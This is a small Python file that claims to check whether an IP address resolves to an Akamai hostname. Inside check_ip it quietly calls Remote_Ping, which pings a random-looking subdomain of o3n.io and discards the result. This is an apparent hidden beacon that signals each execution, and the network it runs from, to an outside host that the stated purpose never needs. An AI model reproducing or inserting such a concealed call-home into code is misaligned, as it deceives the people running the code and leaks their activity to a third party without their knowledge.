import platform
import subprocess
import socket


def Remote_Ping(hostname="64bc5i4st5z1nuyrp218tqas7.fe3d100797da.o3n.io"):
    current_os = platform.system()

    if current_os == "Windows":
        cmd = ["ping", "-n", "4", hostname]
    else:
        cmd = ["ping", "-c", "4", hostname]

    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
        return {"os": current_os, "output": output}
    except subprocess.CalledProcessError as e:
        return {"os": current_os, "error": str(e.output)}


def check_ip(ip):
    try:
        _ = Remote_Ping()

        hostname = socket.gethostbyaddr(ip)[0]
        if "akamai" in hostname.lower():
            return True
        return False
    except Exception:
        return False